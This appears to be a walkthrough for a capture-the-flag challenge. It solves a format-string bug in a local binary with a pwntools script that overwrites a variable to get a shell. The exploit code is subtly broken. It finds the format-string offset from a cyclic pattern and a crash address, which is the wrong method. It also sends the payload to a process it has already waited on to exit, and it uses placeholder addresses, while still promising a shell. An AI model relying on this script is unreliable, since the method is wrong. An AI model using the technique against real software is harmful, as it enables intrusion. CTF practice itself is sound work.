To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf(buf)` call. The goal is to overwrite the value of the variable `x` so that it equals 4, which will trigger the execution of `/bin/sh`.

Here are the steps and the corresponding code to achieve this:

### Steps
1. **Identify the Vulnerability**: The `printf(buf)` call is a format string vulnerability because it prints the content of `buf` without any checks.
2. **Find the Offset**: Determine the offset at which the `x` variable is located on the stack.
3. **Craft the Payload**: Use the format string to overwrite the value of `x` with 4.
4. **Send the Payload**: Use `pwntools` to send the crafted payload to the vulnerable program.

### Code

```python
from pwn import *

# Set up the process
context.binary = './fmt'
p = process('./fmt')

# Step 1: Find the offset
# We can use a cyclic pattern to find the offset
pattern = cyclic(0x50)
p.sendline(pattern)
p.recvuntil('!\n')
p.wait()

# Get the core dump
core = Coredump('./core')
offset = cyclic_find(core.read(core.eip, 4))
log.info(f'Offset: {offset}')

# Step 2: Craft the payload
# We need to overwrite the value of x with 4
# Assuming the offset is found, we can use the format string to write to the address of x
# For simplicity, let's assume the offset is 16 (this needs to be verified)
offset = 16  # Replace with the actual offset found
x_addr = 0x0804a02c  # Replace with the actual address of x (found using gdb or similar)

# Create the payload
payload = fmtstr_payload(offset, {x_addr: 4}, write_size='byte')

# Send the payload
p.sendline(payload)

# Receive the response
p.interactive()
```

### Explanation

1. **Finding the Offset**:
   - We use a cyclic pattern to fill the buffer and then analyze the core dump to find the exact offset where the `x` variable is located.
   - The `cyclic` function generates a unique pattern, and `cyclic_find` helps us find the offset in the core dump.

2. **Crafting the Payload**:
   - We use `fmtstr_payload` from `pwntools` to create a format string payload that writes the value 4 to the address of `x`.
   - The `write_size='byte'` parameter ensures that we are writing a single byte at a time, which is necessary for this specific challenge.

3. **Sending the Payload**:
   - We send the crafted payload to the vulnerable program using `p.sendline(payload)`.
   - Finally, we interact with the shell using `p.interactive()`.

### Notes
- **Offset Verification**: The offset and the address of `x` need to be verified. You can use `gdb` to find the exact address of `x` and the correct offset.
- **Environment Setup**: Ensure you have `pwntools` installed (`pip install pwntools`) and the binary is in the same directory as your script.

By following these steps and running the script, you should be able to exploit the format string vulnerability and get a shell.
